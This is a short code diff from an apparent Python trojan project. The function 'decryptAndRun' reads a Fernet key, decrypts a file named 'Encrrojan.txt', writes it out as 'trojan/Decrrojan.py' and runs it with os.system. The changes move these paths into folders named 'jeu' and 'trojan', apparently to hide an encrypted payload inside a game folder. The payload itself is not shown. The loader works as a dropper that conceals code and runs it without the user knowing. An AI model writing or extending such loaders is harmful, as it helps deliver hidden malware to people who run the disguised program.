@@ -18,23 +18,20 @@ def enryptFILE():
 
 
 def decryptAndRun():
-    with open ("trojan/key.txt" , 'rb') as file:
+    with open ("jeu/key.txt" , 'rb') as file:
         key = file.read()
 
     f =Fernet (key)
 
-    with open ("Encrrojan.txt" , 'rb') as encrypted_file:
+    with open ("jeu/Encrrojan.txt" , 'rb') as encrypted_file:
         encrypted = encrypted_file.read()
 
     decrypted = f.decrypt(encrypted)
 
-    with open ("Decrrojan.py" , 'wb') as decrypted_file:
+    with open ("trojan/Decrrojan.py" , 'wb') as decrypted_file:
         decrypted_file.write(decrypted)
 
 
 
     #run
-    os.system("python3 Decrrojan.py")
-
-
-
+    os.system("python3 trojan/Decrrojan.py")
